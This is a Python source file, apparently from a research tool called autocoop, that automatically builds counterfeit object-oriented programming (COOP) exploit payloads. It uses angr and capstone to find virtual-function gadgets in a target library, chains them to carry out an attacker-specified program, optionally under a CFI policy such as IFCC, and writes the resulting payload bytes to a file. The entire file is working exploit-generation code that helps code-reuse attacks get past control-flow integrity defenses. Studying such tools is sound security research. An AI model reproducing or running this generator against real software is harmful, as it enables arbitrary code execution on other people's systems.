from autocoop.esl.parser import Parser, StatementParser
import autocoop.esl_lib.lib_utils.candidate_finder as candidate_finder
import angr
import sys
import logging
import utils.utils as utils
import pprint
import autocoop.esl_lib.lib_utils.capstone_utils as capstone_utils
import tqdm


class Config(object):
    """
    Holds configuration for :class:`.ExploitGenerator` objects.

    :param str executable: the executable the payload should be generate for
    :param int base_mod: address the executable will be loaded at
    :param int base_buf: address the payload will be loaded at
    :param int max_payload_size: maximum size of the generated payload
    :param kwargs: other arguments to be used by the gadget builders
    """
    def __init__(self, executable, base_mod, base_buf, max_payload_size, **kwargs):
        self.executable = executable
        self.base_mod = base_mod
        self.base_buf = base_buf
        self.max_payload_size = max_payload_size
        self.other_args = kwargs
        self.vptr_offset = 0

class ExploitGenerator(object):
    """
    Generates the payload.

    :param Config config: the configuration of the exploit generator
    """
    def __init__(self, config):
        self.logger = logging.getLogger("autocoop.exploit_generator")
        self.logger.info("[*] Loading angr project")
        self.all_calltargets = []
        self.config = config
        self.target_app = angr.Project(self.config.executable, auto_load_libs=False,
                                       main_opts={"custom_base_addr": self.config.base_mod},
                                       translation_cache=False)
        self.target_app.kb.entry_state = self.target_app.factory.entry_state()
        self.target_app.kb.if_object_offset = 100 + self.config.base_buf
        self.target_app.kb.if_object_inc = 100
        self.target_app.config_class = self.config
        self.target_app.kb.virtual_dispatch = True
        self.target_app.kb.candidates = {}
        self.target_app.kb.vtbls = {}
        self.logger.info("[*] Done loading project")
        # import IPython; IPython.embed()

    def generate_payload(self, parsed_program):
        """
        Generates a payload that executes the provided program.

        :param Parser parsed_program: Parser that parsed the program to be executed
        :return: the payload as a bytestring
        :rtype: str
        """
        for mainloop in parsed_program.main_gadget:
            dispatchers = mainloop.script[0](self.target_app, self.config, parsed_program.main_calls.calls)
            stop=False
            for array_builder, gadget, calltarget_list in dispatchers:
                self.logger.info("Trying next dispatcher: {}".format(gadget.demangled_name))
                self.logger.info("Valid calltarget count: {}".format(len(calltarget_list)))
                if not self.target_app.kb.candidates:
                    self.target_app.kb.candidates = self.generate_candidate_sets(parsed_program)
                for calltarget in self.step_through_program(parsed_program.main_calls.calls, calltarget_list, self.target_app.kb.candidates, []):
                    mainloop.script[1](array_builder, calltarget)
                    return array_builder.finalize(self.config.max_payload_size)
                self.logger.info("No valid gadget combination found for dispatcher " + str(gadget.demangled_name))
                if not self.config.other_args.get("policy", None):
                    stop=True
                    break
            if stop:
                break
        raise Exception("No valid chain found.")

    def apply_calltarget_list(self, candidates, list2):
        """
        Finds and returns all gadgets that are both in the candidate and the valid calltarget lists

        :param list candidates: Candidate gadgets based on semantic filtering
        :param list list2: Candidate gadgets reachable from dispatcher
        :return: Valid candidates that are also reachable
        :rtype: list
        """
        return list(set(candidates) & set(list2))

    def generate_candidate_sets(self, parsed_program):
        """
        Generates the set of usable gadgets per gadget type

        :param Parser parsed_program: Parsed program specifying the gadget types to look for

        :return: Dict of gadget ids and calltarget sets
        :rtype: dict
        """
        gadgets = dict()
        names = dict()
        if self.config.other_args.get("policy", None):
            self.all_calltargets = candidate_finder.get_candidate_gadgets_from_csv(self.target_app, self.config.other_args["gadget_csv"], self.config.other_args["policy"])
        else:
            self.all_calltargets = candidate_finder.get_all_functions(self.target_app)
        self.logger.info("[*] Searching for usable candidate gadgets ({} candidates)".format(len(self.all_calltargets)))
        for functionname, representations in parsed_program.functions.items():
            for function in representations:
                if type(function.script) != tuple:
                    category = function.function_id()
                    gadgets[category] = []
                    names[category] = functionname
        for calltarget in tqdm.tqdm(self.all_calltargets):
            for functionname, representations in parsed_program.functions.items():
                for function in representations:
                    if type(function.script) != tuple:  # dont do this for mainloops
                        category = function.function_id()
                        insns = capstone_utils.get_function_capstone(self.target_app, calltarget[1])
                        if function.script.is_candidate_function(self.target_app, insns):
                            gadgets[category].append(calltarget)

        for gadget, items in gadgets.items():
            self.logger.info("[{}] Gadget {} [ID {}]: {} usable candidates".format("+" if len(items) else "-",
                                                                                           names[gadget], gadget,
                                                                                           len(items)))
        self.logger.info("[*] Usable gadget search finished")
        return gadgets

    def build_chains(self, rest, assignments):
        """
        Generate candidate gadget chains

        :param rest: Rest of the ESL payload that still needs to be translated
        :param assignments: variable assignments
        :yield: a gadget chain
        """
        if not rest:
            yield tuple()
            return
        next_call = rest[0].copy()
        next_call.concretize_assignments(assignments)
        next_call.concretize_values()
        new_rest = rest[1:]
        for fn in next_call.function:
            if type(fn) == StatementParser:
                fn_assignments_new = [assignment.copy() for assignment in fn.assignments]
                for i, argument in enumerate(fn_assignments_new):
                    if len(next_call.args) <= i:
                        break
                    fn_assignments_new[i].value = next_call.args[i].value
                    fn_assignments_new[i].is_ptr = next_call.args[i].is_ptr
                new_calls = []
                for call in fn.calls:
                    new_calls.append(call.copy())
                for call in new_calls:
                    call.postconditions.extend(next_call.postconditions)
                if next_call.label:
                    new_calls[0].label = next_call.label
                new_calls[0].assignments.extend([assignment.copy() for assignment in next_call.assignments])
                new_calls[0].assignments.extend(fn_assignments_new)
                for chain in self.build_chains(new_calls + new_rest, fn_assignments_new):
                    yield chain
            else:
                for chain in self.build_chains(new_rest, next_call.assignments):
                    yield ((next_call, fn),) + chain

    def order_chains(self, chains):
        """
        Order chains by some metric

        :param chains: chains to order
        """
        chains.sort(key=lambda x: self.get_score(x))

    def get_score(self, chain):
        """
        Gets the score for a chain using a ranking based on difficulty

        :param chain: chain to test
        :return: gadget score
        """

        difficulties = {"EXECUTE": (5, 10),
                        "READ": (1, 2),
                        "LOAD": (10, 1),
                        "WRITE": (10, 1),
                        "DEFAULT": (3, 3)}

        score = 0
        for gadget, function in chain:
            candidates = self.target_app.kb.candidates.get(gadget.gadget_id(function), None)
            if candidates == None:
                candidates = self.target_app.kb.candidates.get(function.function_id(), [])
            difficulty, time = difficulties.get(function.name, difficulties["DEFAULT"])
            gadget_score = len(candidates) / (difficulty * time)
            if gadget_score < score or score == 0:
                score = gadget_score
        return score


    def check_if_compatiple_chain(self, chain, candidate_list, calltarget_list):
        """
        Updates the valid calltarget list and eliminates a chain if a required gadget is not found.

        :param chain: chain of gadgets
        :param candidate_list: list of candidate gadgets generated using semantic analysis
        :param calltarget_list: list of calltargets for the current dispatcher
        :return: valid calltarget list for dispatcher
        """
        valid_target_list = {}
        for gadget, function in chain:
            calltarget_id = gadget.gadget_id(function)
            calltargets = self.target_app.kb.candidates.get(calltarget_id, None)
            if calltargets == None:
                calltargets = list(candidate_list.get(function.function_id(), [None]))
                self.target_app.kb.candidates[calltarget_id] = calltargets
            if calltargets == []:
                calltargets = [None]
                self.target_app.kb.candidates[calltarget_id] = [None]
            if not calltargets[0]:
                self.logger.info("[-] Gadget {} [ID {}]: skipped, no usable candidates. Stopping evaluation of chain.".format(function.name,
                                                                                               gadget.gadget_id(
                                                                                                   function)))
                return False
            valid_targets = self.apply_calltarget_list(calltargets, calltarget_list)
            valid_target_list[calltarget_id] = (valid_targets, len(calltargets))
            self.logger.info(
                "[{}] Gadget {} [ID {}]: {} candidates compatible with dispatcher.".format(
                    "+" if len(calltargets) else "-",
                    function.name,
                    gadget.gadget_id(function),
                    len(valid_targets)))
        return valid_target_list

    def test_chain(self, previous, chain, valid_target_list, calltarget_list, candidate_list):
        """
        Steps through a chain and generates the payload

        :param previous: previous gadget added to chain
        :param chain: remaining chain of gadgets
        :param valid_target_list: list of calltargets valid for the dispatcher
        :param calltarget_list: list of candidate calltargets for the dispatcher
        :param candidate_list: general list of candidate calltargets
        :return:
        """
        if len(chain) == 0:
            yield []
            return
        gadget, function = chain[0]
        if previous:
            gadget.update_reg_assignments(previous.assignments)
            gadget.concretize_values()
        calltarget_id = gadget.gadget_id(function)
        valid_targets = valid_target_list.get(calltarget_id, None)
        if not valid_targets:
            new = self.check_if_compatiple_chain(chain, candidate_list, calltarget_list)
            if not new:
                return
            valid_target_list.update(new)
            valid_targets = valid_target_list[calltarget_id]
        calltargets = self.target_app.kb.candidates.get(calltarget_id, None)
        if len(calltargets) != valid_targets[1]:
            valid_target_list[calltarget_id] = (self.apply_calltarget_list(valid_targets[0], calltargets), len(calltargets))
            valid_targets = valid_target_list[calltarget_id]
        if not valid_targets[0]:
            self.logger.info("[-] No valid targets.")
            return
        gadget_class = function.script(self.target_app, self.config, gadget, valid_targets[0],
                                       calltarget_id)
        if self.config.other_args.get("gadgetcounts"):  # additional logic for evaluation
            candidates = list(gadget_class.search())
            with open("results/detailed/nodejs/calltargets.csv", "a") as file:
                file.write(str(function.name) + "," + str(self.config.other_args.get("policy", None)) + "," + str(valid_targets[1]) + "," + str(len(candidates)))
        else:
            candidates = gadget_class.search()
        for calltarget in candidates:
            for res in self.test_chain(gadget, chain[1:], valid_target_list, calltarget_list, candidate_list):
                if type(res) == list:
                    yield [calltarget] + res
            else:
                continue # Try a different gadget


    def step_through_program(self, calls, calltarget_list, candidate_list, prev_gadgets):
        """
        Steps through potential chains and generates gadgets

        :param list calls: Parsed program to step through
        :param list calltarget_list: List of reachable calltargets
        :param dict candidate_list: List of candidates per gadget type
        :param list prev_gadgets: Gadgets preceding the current one in gadget chain

        :yields: list of calltargets and their corresponding objects, in order of execution
        """
        chains = list(self.build_chains(calls, []))
        self.order_chains(chains)
        for chain in chains:
            self.logger.info("[*] Testing new chain of length {}.".format(len(chain)))
            valid_targets = self.check_if_compatiple_chain(chain, candidate_list, calltarget_list)
            if not valid_targets:
                continue
            for i in self.test_chain(None, chain, valid_targets, calltarget_list, candidate_list):
                yield i





if __name__ == '__main__':
    logging.getLogger('angr').setLevel(logging.ERROR)
    logging.getLogger('autocoop.esl_lib.gadgets').setLevel(logging.INFO)
    logging.getLogger('autocoop.exploit_generator').setLevel(logging.INFO)
    logging.getLogger("autocoop.candidate_finder").setLevel(logging.INFO)
    logging.getLogger("autocoop.esl_lib.mainloop").setLevel(logging.INFO)
    logging.getLogger("autocoop.esl_lib.loopless").setLevel(logging.INFO)

    config = Config("exploitable_app/testapp/cmake-build-debug/libAPP.so",
                    0x7ffff7ff1000,             # library base address
                    0xa0000000,                 # buffer start address
                    4096,                       # buffer size

                    # uncomment the next two lines to enable the IFCC cfi policy
                    # gadget_csv="exploitable_app/testapp/cmake-build-debug/SDOutput/libAPP.so-Virtual-metric.csv",
                    # policy="IFCC"


                    )

    explgen = ExploitGenerator(config)
    program = Parser(sys.argv[1])
    res = explgen.generate_payload(program)
    if type(res) in (list, tuple):
        for i in res:
            utils.print_region(config.base_buf, int(i.encode("hex"), 16), len(i))
    else:
        utils.print_region(config.base_buf, int(res.encode("hex"), 16), len(res))
    print res.encode("hex")
    f = open("input", "wb")
    f.write(res)
    f.close()
    print "[i] Wrote %d bytes." % len(res)
